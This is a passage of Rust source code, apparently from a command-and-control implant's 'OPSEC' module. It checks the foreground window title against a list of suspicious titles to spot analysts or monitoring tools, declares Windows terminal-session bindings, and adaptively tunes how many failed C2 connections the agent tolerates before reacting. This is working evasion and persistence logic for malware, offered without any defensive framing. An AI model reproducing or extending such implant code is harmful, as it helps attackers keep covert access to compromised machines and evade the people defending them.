        debug!("[OPSEC WINDOW] Could not get window title (HWND: {:?}).", hwnd);
        return false;
    }

    buffer.truncate(len as usize);
    let title_os = OsString::from_wide(&buffer);
    if let Some(title_str) = title_os.to_str() {
        let title_lc = title_str.to_lowercase();
        debug!("[OPSEC WINDOW] Foreground window title: '{}'", title_str);
        for suspicious_title_pattern in &*SUSPICIOUS_WINDOW_TITLES {
             // Use case-insensitive comparison
            if title_lc.contains(&suspicious_title_pattern.to_lowercase()) {
                warn!(
                    "[OPSEC WINDOW] Suspicious foreground window detected: '{}' (Matches: '{}')",
                    title_str,
                    suspicious_title_pattern
                );
                return true; // Found a match
            }
        }
    } else {
        debug!("[OPSEC WINDOW] Window title is not valid UTF-8.");
    }

    false // No suspicious title found
}

#[cfg(not(target_os = "windows"))]
fn check_foreground_window_title() -> bool {
    // Placeholder for non-Windows systems (Linux is complex)
    debug!("[OPSEC WINDOW] check_foreground_window_title() not implemented for this platform.");
    // Returning false to avoid unnecessary alerts on unsupported platforms.
    // A proper Linux implementation would likely involve interacting with X11 or Wayland.
    false
}
// --- END NEW WINDOW CHECK --- 

#[cfg(target_os = "windows")]
#[allow(non_camel_case_types, non_snake_case, non_upper_case_globals)]
mod wts_ffi {
    use std::os::raw::{c_void};
    use winapi::shared::minwindef::{DWORD, LPVOID};
    use winapi::shared::ntdef::LPWSTR;

    pub type HANDLE = *mut c_void;
    // DWORD is already brought in via winapi::shared::minwindef
    // LPWSTR from winapi::shared::ntdef

    pub const WTS_CURRENT_SERVER_HANDLE: HANDLE = ptr::null_mut();
    pub const WTS_CURRENT_SESSION: DWORD = 0xFFFFFFFF;
    
    // From Wtsapi32.h
    pub const WTSConnectState: u32 = 0; // This corresponds to WTS_INFO_CLASS::WTSConnectState

    #[repr(C)]
    #[derive(Debug, Copy, Clone, PartialEq, Eq)] 
    pub enum WTS_CONNECTSTATE_CLASS {
        WTSActive,          // User logged on to WinStation
        WTSConnected,       // WinStation connected to client
        WTSConnectQuery,    // In the process of connecting to client
        WTSShadow,          // Shadowing another WinStation
        WTSDisconnected,    // WinStation logged on without client
        WTSIdle,            // Waiting for new client connection
        WTSListen,          // WinStation is listening for connection
        WTSReset,           // WinStation is being reset
        WTSDown,            // WinStation is down due to error
        WTSInit,            // WinStation in initialization
    }

    extern "system" {
        pub fn WTSQuerySessionInformationW(
            hServer: HANDLE,
            SessionId: DWORD,
            WTSInfoClass: DWORD, // This should be WTS_INFO_CLASS enum value, e.g. WTSConnectState
            ppBuffer: *mut LPWSTR, // Pointer to a pointer to the data
            pBytesReturned: *mut DWORD,
        ) -> BOOL;

        pub fn WTSFreeMemory(pMemory: LPVOID);
    }
    use std::ptr; // Added for ptr::null_mut in WTS_CURRENT_SERVER_HANDLE
    use winapi::shared::minwindef::BOOL;
}

// --- NEW: C2 Stability Check Logic ---
fn check_c2_stability() -> bool {
    if let Ok(state_guard) = OPSEC_STATE.lock() {
        // Use the dynamic threshold from the state
        let threshold = state_guard.dynamic_max_c2_failures;
        let unstable = state_guard.consecutive_c2_failures >= threshold;
        if unstable {
            warn!(
                "[OPSEC C2] Stability check FAILED: {} failures >= dynamic threshold {}",
                state_guard.consecutive_c2_failures, threshold
            );
        } else {
             debug!(
                "[OPSEC C2] Stability check OK: {} failures < dynamic threshold {}",
                state_guard.consecutive_c2_failures, threshold
            );
        }
        unstable
    } else {
        error!("[OPSEC C2] Failed to lock OPSEC_STATE for stability check.");
        false // Default to stable if state lock fails
    }
}
// --- END NEW C2 CHECK ---

// --- NEW: Adaptive C2 Threshold Adjustment Logic ---
fn adjust_c2_failure_threshold(
    opsec_state: &mut OpsecState,
    config: &crate::config::AgentConfig,
) {
    // Initialize the dynamic threshold from config on the first call
    if !opsec_state.dynamic_threshold_initialized {
        opsec_state.dynamic_max_c2_failures = config.base_max_consecutive_c2_failures;
        opsec_state.dynamic_threshold_initialized = true;
        opsec_state.last_c2_threshold_adjustment = Instant::now(); // Reset timer after init
        debug!("[OPSEC C2 ADAPT] Initialized dynamic threshold to {}", opsec_state.dynamic_max_c2_failures);
        return; // No adjustment on the very first run
    }

    // Check if adjustment interval has passed (and if adjustment is enabled)
    let adjustment_interval = Duration::from_secs(config.c2_threshold_adjust_interval_secs);
    if adjustment_interval == Duration::MAX || opsec_state.last_c2_threshold_adjustment.elapsed() < adjustment_interval {
        return; // Interval not passed or feature disabled
    }

    let base_threshold = config.base_max_consecutive_c2_failures;
    // Ensure max_multiplier is at least 1.0 to avoid max < base
    let max_multiplier = config.c2_dynamic_threshold_max_multiplier.max(1.0);
    let max_threshold = ((base_threshold as f32 * max_multiplier).round() as u32).max(base_threshold);
    let current_dynamic_threshold = opsec_state.dynamic_max_c2_failures;
    let new_dynamic_threshold: u32; // Declare without initializing

    if opsec_state.consecutive_c2_failures == 0 {
        // Network appears stable (no current consecutive failures), increase threshold
        let increase_factor = config.c2_failure_threshold_increase_factor.max(1.0); // Ensure factor >= 1.0
        new_dynamic_threshold = (current_dynamic_threshold as f32 * increase_factor).round() as u32;
        debug!("[OPSEC C2 ADAPT] Stable network detected (0 failures). Attempting to increase threshold.");
    } else {
        // Network appears unstable (ongoing failures), decrease threshold
        let decrease_factor = config.c2_failure_threshold_decrease_factor.clamp(0.1, 1.0); // Ensure 0.1 <= factor <= 1.0
        new_dynamic_threshold = (current_dynamic_threshold as f32 * decrease_factor).round() as u32;
         debug!("[OPSEC C2 ADAPT] Unstable network detected ({} failures). Attempting to decrease threshold.", opsec_state.consecutive_c2_failures);
    }

    // Clamp the new threshold between base and max
    let clamped_new_threshold = new_dynamic_threshold.clamp(base_threshold, max_threshold);

    if clamped_new_threshold != current_dynamic_threshold {
        info!(
            "[OPSEC C2 ADAPT] Adjusted C2 failure threshold from {} to {} (Base: {}, Max: {})",
            current_dynamic_threshold,
            clamped_new_threshold,
            base_threshold,
            max_threshold
        );
        opsec_state.dynamic_max_c2_failures = clamped_new_threshold;
    } else {
        debug!(
            "[OPSEC C2 ADAPT] Dynamic threshold remains {} (Base: {}, Max: {})",
            current_dynamic_threshold, base_threshold, max_threshold
        );
    }

    // Update last adjustment time regardless of whether the value changed
    opsec_state.last_c2_threshold_adjustment = Instant::now();
}
// --- END NEW ---